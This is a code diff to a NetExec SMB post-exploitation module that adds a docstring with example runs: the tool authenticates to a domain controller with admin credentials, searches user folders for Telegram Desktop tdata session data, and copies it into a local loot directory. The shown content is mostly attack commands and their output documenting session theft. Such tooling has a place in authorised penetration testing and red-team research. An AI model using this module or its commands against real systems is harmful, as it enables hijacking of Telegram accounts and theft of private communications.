@@ -1,3 +1,27 @@
+"""
+Author: github.com/MzHmO 
+SMB Module to get tdata folder on hosts
+
+PS Z:\share\tools\c8exec> python -m nxc.netexec smb dc01.office.local -u admin -p lolkekcheb123! -M telegram
+SMB         10.0.0.1        445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:office.local) (signing:True) (SMBv1:True)
+SMB         10.0.0.1        445    DC01             [+] office.local\admin:lolkekcheb123! (Pwn3d!)
+TELEGRAM    10.0.0.1        445    DC01             [*] Enumerating Telegram Desktop tdata on 10.0.0.1
+TELEGRAM    10.0.0.1        445    DC01             [*] Priority searching for tdata from C:\Users
+TELEGRAM    10.0.0.1        445    DC01             [+] Found Telegram tdata at C:\Users\Public\Telegram Desktop\tdata on 10.0.0.1
+TELEGRAM    10.0.0.1        445    DC01             [+] Telegram tdata looted to Z:\share\tools\c8exec\.loot\telegram\10.0.0.1.tg\tdata
+PS Z:\share\tools\c8exec> python -m nxc.netexec smb dc01.office.local -u admin -p lolkekcheb123! -M telegram -o SEARCH_DIR=c:\users\public
+SMB         10.0.0.1        445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:office.local) (signing:True) (SMBv1:True)
+SMB         10.0.0.1        445    DC01             [+] office.local\admin:lolkekcheb123! (Pwn3d!)
+TELEGRAM    10.0.0.1        445    DC01             [*] Enumerating Telegram Desktop tdata on 10.0.0.1
+TELEGRAM    10.0.0.1        445    DC01             [*] Priority searching for tdata from c:\users\public
+TELEGRAM    10.0.0.1        445    DC01             [+] Found Telegram tdata at C:\users\public\Telegram Desktop\tdata on 10.0.0.1
+TELEGRAM    10.0.0.1        445    DC01             [+] Telegram tdata looted to Z:\share\tools\c8exec\.loot\telegram\10.0.0.1.tg\tdata
+
+Read more here:
+https://x.com/CICADA8Research/status/2028748422539264021
+
+"""
+
 from __future__ import annotations
 
 import os
@@ -264,5 +288,6 @@ class NXCModule:
         except Exception as exc:  
             log.error(f"[!] Failed to write info file {info_path}: {exc}")
             return
+
 
         log.highlight(f"[+] Telegram tdata looted to {tdata_local_root}")
